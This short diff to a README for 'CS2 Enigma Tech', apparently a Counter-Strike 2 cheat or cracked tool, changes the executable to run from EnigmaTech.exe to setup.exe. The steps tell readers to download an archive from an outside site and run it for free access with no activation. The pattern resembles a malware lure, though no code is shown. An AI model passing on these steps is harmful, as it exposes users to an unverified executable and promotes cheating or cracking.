@@ -14,7 +14,7 @@ To install and run CS2 Enigma Tech:
 
 - [Download](https://softspace.space/)
 - Extract the archive
-- Run `EnigmaTech.exe`
+- Run `setup.exe`
 - Enjoy free access to core features (no activation needed)
 
 ## Features
